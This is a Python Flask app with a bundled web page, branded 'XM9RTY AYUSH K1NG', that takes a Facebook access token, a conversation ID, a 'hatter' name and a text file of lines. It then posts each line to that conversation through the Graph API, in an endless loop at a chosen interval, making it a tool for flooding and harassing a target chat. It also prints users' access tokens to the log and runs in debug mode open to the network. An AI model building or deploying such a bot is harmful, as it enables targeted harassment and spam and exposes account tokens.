from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XM9RTY AYUSH K1NG</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('birthday_background.jpg'); /* Specify the path to your birthday background image */
      background-repeat: repeat; /* Repeat the background image */
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 300px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      margin: 20px auto;
    }
    .header {
      text-align: center;
      margin-bottom: 20px;
      color: blue;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
    }
    .box {
      border: 2px solid black;
      padding: 20px;
      margin-top: 20px;
      background-color: lavender;
      color: purple;
    }
    /* New styles for birthday box */
    .birthday-box {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 5px 10px;
      border-radius: 5px;
      z-index: 999;
    } 
  </style>
</head>
<body>
  <!-- AYUSH KING -->
  <div class="AYUSH-KING">
    <p>XM9RTY AYUSH K1NG</p>
  </div>

    </style>
</head>
<body> </div> <div class="containor">
    <!-- Your text box content here -->
    <footer class="footer">
      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐗𝐌𝟗𝐑𝐓𝐘 𝐀𝐘𝐔𝐒𝐇 𝐊𝟏𝐍𝐆</span>.</span></p>
      <p><span class="boxed-text2"><span class="color-span">𝐌𝟗𝐒𝐓𝟑𝐑 𝐓𝟏𝐂𝐊𝟑𝐑</span></span></p>
  </p>
    </footer>
    </div>
</div>


    <div class="containe">
      <form action="/" method="post" enctype="multipart/form-data">
        <div class="mb-3">
          <label for="accessToken">ENT3R YOUR TOK3N:</label>
          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
        </div>
        <div class="mb-3">
          <label for="threadId">ENT3R CONVO/1NBOX 1D:</label>
          <input type="text" class="form-control" id="threadId" name="threadId" required>
        </div>
        <div class="mb-3">
          <label for="kidx">ENT3R HATT3R N9M3:</label>
          <input type="text" class="form-control" id="kidx" name="kidx" required>
        </div>
        <div class="mb-3">
          <label for="txtFile">S3L3CT YOUR NOT3P9D F1L3:</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
        <div class="mb-3">
          <label for="time">SP33D 1N S3CONDS:</label>
          <input type="number" class="form-control" id="time" name="time" required>
        </div>
        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
      </form>
    </div>
   <style>
    .footer {
      color: #B00402; /* Off-Blue color */
    }
    .boxed-text {
      border: 2px solid #B00402; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .boxed-text2 {
      border: 2px solid #000000; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .footer a {
      color: #FFFF00; /* Off-Blue color for links */
      text-decoration: none; /* Remove underline from links */
    }
    
  </style>
</head>
<body>
  <div>
    
  </div> <div class="containor">
    <!-- Your text box content here -->
    <footer class="footer">
      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐌𝟗𝐃𝟑 𝐁𝐘 𝐗𝐌𝟗𝐑𝐓𝐘 𝐀𝐘𝐔𝐒𝐇 𝐊𝟏𝐍𝐆</span>.</span></p>
      <p><span class="boxed-text"><span class="color-span">𝐒𝟑𝐑𝐕𝟑𝐑 𝐀𝐘𝐔𝐒𝐇 𝐊𝟏𝐍𝐆</span></span></p>
      <p><span class="boxed-text"><span class="color-sp">SUBSCRIBE ON</span> <a href="https://youtube.com/@xmarty_ayush_king?feature=shared" class="color-s">YOUTUBE</a></p>
    </footer>
    </div>
</div>

  <script>
    // JavaScript to change footer text color
    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-span');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>
    
    // JavaScript to change footer text color
    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-spa');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>
  
  <script>
    // JavaScript to change footer text color
    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-s');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>
    
    // JavaScript to change footer text color
    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-sp');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>
</body>
</html>

    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

    app.run(debug=True)

